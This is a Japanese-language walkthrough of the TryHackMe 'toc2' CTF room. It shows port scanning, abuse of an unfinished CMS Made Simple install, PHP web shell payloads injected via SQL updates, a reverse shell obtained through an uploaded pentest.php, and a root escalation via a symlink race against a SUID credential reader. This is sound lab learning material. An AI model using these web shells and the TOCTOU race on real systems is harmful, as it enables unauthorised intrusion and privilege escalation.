# toc2 CTF

https://tryhackme.com/room/toc2

## Enumeration

```shell
TARGET=10.67.166.111
sudo bash -c "echo $TARGET   toc2 >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

SSH, HTTPのみ。

```sh
root@ip-10-67-72-98:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.67.166.111
+ Target Hostname:    toc2
+ Target Port:        80
+ Start Time:         2025-12-05 01:52:27 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x316 0x5ad16bb7d7380 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ File/dir '/cmsms/cmsms-2.1.6-install.php' in robots.txt returned a non-forbidden or redirect HTTP code (301)
+ "robots.txt" contains 1 entry which should be manually viewed.
+ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET
```

cmsms-2.1.6。

トップページの表示。

```
Under Construction!
Sorry for the inconvenience but management have once again asked for more than we can deliver.

The web server isn't going to be ready for the web dev team to build on for another few days. Just in case anyone around here except me wants to do anything: cmsmsuser:devpass

— Hunter
```

cmsms の脆弱性を検索。Metasploitのモジュールがあるが、実行したところ「脆弱性なし」と判定された。そもそもまだシステムがインストールされていないようなので当然か？

```sh
$ searchsploit cmsms      
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)                                                                                                                      | php/remote/46627.rb
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

/cmsms/ にアクセスしてインストールPHPを実行したが、DB接続ができず詰まる。

自分のマシンでDBを起動して接続させればインストールできてmetasploitを使えるのではないか？

```sh
$ cat /etc/mysql/mariadb.conf.d/50-server.cnf

#bind-address            = 127.0.0.1
bind-address            = 0.0.0.0
```

```sh
MariaDB [(none)]> CREATE USER 'thm'@'%' IDENTIFIED BY '.....';
Query OK, 0 rows affected (0.121 sec)

MariaDB [(none)]> GRANT ALL PRIVILEGES ON *.* TO 'thm'@'%' WITH GRANT OPTION;
```

```sh
sudo systemctl restart mariadb
```

kaliのDBを接続先に指定することで、インストールできた。  
インストール完了ページにAdminログイン画面のURLが表示されているので遷移。

- この状態でもMetasploitは機能しなかった。

```sh
msf6 exploit(multi/http/cmsms_upload_rename_rce) > exploit
[*] Started reverse TCP handler on 192.168.19.128:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated.
[-] Exploit aborted due to failure: no-access: Authentication was unsuccessful
[*] Exploit completed, but no session was created.
```

- テンプレート編集からPHPを埋め込もうとしたが、コードが表示されるだけ
- PHPファイルアップロードできるが、実行はできない。コードが表示されるだけ

DBの中身に注目する。

```sql
MariaDB [cmsms]> select * from cms_content_props;
```

インストール後の /cmsms で表示されている文言を発見。

```sh
| content_id | type   | prop_name  | param1 | param2 | param3 | content | create_date | modified_date       |

|          2 | string | content_en | NULL   | NULL   | NULL   | <p>So how is a web-site created with CMS Made Simple? There are a couple of terms that are central to understanding this.</p><p>You first need to have templates, which is the HTML code for your pages. This is styled with CSS in one or more style sheets that are attached to each template. You then create pages that contain your websites content using one of these templates.</p><p>That doesn't sound too hard, does it? Basically you don't need to know any HTML or CSS to get a site up with CMS Made Simple. But if you want to customize it to your liking, consider learning some <a class="external" href="http://www.w3schools.com/css/" target="_blank">CSS</a>.</p><p>In the menu to the left you can read more about this, as well as more advanced features like the Menu Manager, additional extensions for adding many kinds of functionality to your site and the Event Manager for managing work flow. Last is a summary of the basic work flow when creating a site with CMS Made Simple.</p>                                        | NULL        | 2025-12-05 04:38:10 |
```

PHPシェルを入れてみたが、画面更新しても文言が変わらない

```sql
MariaDB [cmsms]> update cms_content_props set content='<?=`$_GET[0]`?>' where content_id=1 and prop_name='content_en'; 
```

Newsを書き換えたら表示は変わったがコマンド実行ができなかった。

```sh
MariaDB [cmsms]> update cms_module_news set news_data='<?=`$_GET[0]`?>' where news_id=1;
Query OK, 1 row affected (0.000 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

もう一度 pentest.php をアップロードしてアクセスしてみたら、普通にリバースシェルを取れた。原因不明・・・

## 権限昇格１

```sh
www-data@ip-10-64-173-99:/home/frank$ cat new_machine.txt
I'm gonna be switching computer after I get this web server setup done. The inventory team sent me a new Thinkpad, the password is "password". It's funny that the default password for all the work machines is something so simple...Hell I should probably change this one from it, ah well. I'm switching machines soon- it can wait.
```

書かれている通りのパスワードを打ってみたら昇格できた。

```sh
www-data@ip-10-64-173-99:/home/frank$ su frank
Password: 
frank@ip-10-64-173-99:~$ id
uid=1000(frank) gid=1000(frank) groups=1000(frank),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)
```

## 権限昇格２

root SUID が付いた、readreds を発見。

```sh
frank@ip-10-64-173-99:~$ ls -al root_access
total 28
drwxr-xr-x 2 frank frank 4096 Jan 31  2021 .
drwxr-xr-x 5 frank frank 4096 Aug 18  2020 ..
-rwsr-xr-x 1 root  root  8704 Jan 31  2021 readcreds
-rw-r--r-- 1 root  root   656 Jan 31  2021 readcreds.c
-rw------- 1 root  root    34 Aug 23  2020 root_password_backup
```

```c
frank@ip-10-64-173-99:~$ cat root_access/readcreds.c
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>

int main(int argc, char* argv[]) {
    int file_data; char buffer[256]; int size = 0;

    if(argc != 2) {
        printf("Binary to output the contents of credentials file \n ./readcreds [file] \n"); 
        exit(1);
    }

    if (!access(argv[1],R_OK)) {
            sleep(1);
            file_data = open(argv[1], O_RDONLY);
    } else {
            fprintf(stderr, "Cannot open %s \n", argv[1]);
            exit(1);
    }

    do {
        size = read(file_data, buffer, 256);
        write(1, buffer, size);
    } 
    
    while(size>0);
}
```

/etc/passwd は普通に読めるが、

```sh
frank@ip-10-64-173-99:~/root_access$ ./readcreds /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```

/etc/shadow は読めない。root の SUID が付いているのになぜ？

```sh
frank@ip-10-64-173-99:~/root_access$ ./readcreds /etc/shadow
Cannot open /etc/shadow
```

access は実際のユーザーをもとに評価されるため、「アクセスできない」となっていた。

```c
    if (!access(argv[1],R_OK)) {
```

### link を作る

ダメだった。  
access()はリンク先の権限で判定される。考えてみれば当たり前だが。

```sh
frank@ip-10-64-173-99:~/root_access$ ln -s ./root_password_backup ./link
frank@ip-10-64-173-99:~/root_access$ ./readcreds ./link
Cannot open ./link 
```

### 競合攻撃

1秒スリープしているのを利用して競合攻撃を実行する。  
access実行時には権限のあるファイルにリンクし、スリープ中にリンク先を差し替える。

```sh
frank@ip-10-64-173-99:~/root_access$ ln -s /home/frank/user.txt ./link
frank@ip-10-64-173-99:~/root_access$ ./readcreds ./link &
[1] 6440
frank@ip-10-64-173-99:~/root_access$ sleep 0.5
frank@ip-10-64-173-99:~/root_access$ rm ./link
frank@ip-10-64-173-99:~/root_access$ ln -s ./root_password_backup ./link
frank@ip-10-64-173-99:~/root_access$ Root Credentials:  root:[REDACTED]
```

昇格成功。

```sh
frank@ip-10-64-173-99:~/root_access$ su root
Password: 
root@ip-10-64-173-99:/home/frank/root_access# id
uid=0(root) gid=0(root) groups=0(root)
```

## 振り返り

- 他の人のウォークスルーを見たところ、自分のDBに接続させる必要はなかった。書かれていた認証情報で接続できた。自分もそれは試したが、`cmsmsdb` というデータベース名が分からなかった。
- pentest.php をアップロード後にアクセスするのは早い段階で試していたがその時はたしかに動作していなかった。このためかなりの時間を浪費してしまった。VM再起動も実行しており原因不明。
- この競合のパターンは別のBOXでも見たことがあるがすっかり忘れていた。access関数は実際のユーザーで評価される。良い復習になった。

## Tags

#tags:競合 #tags:cmsms
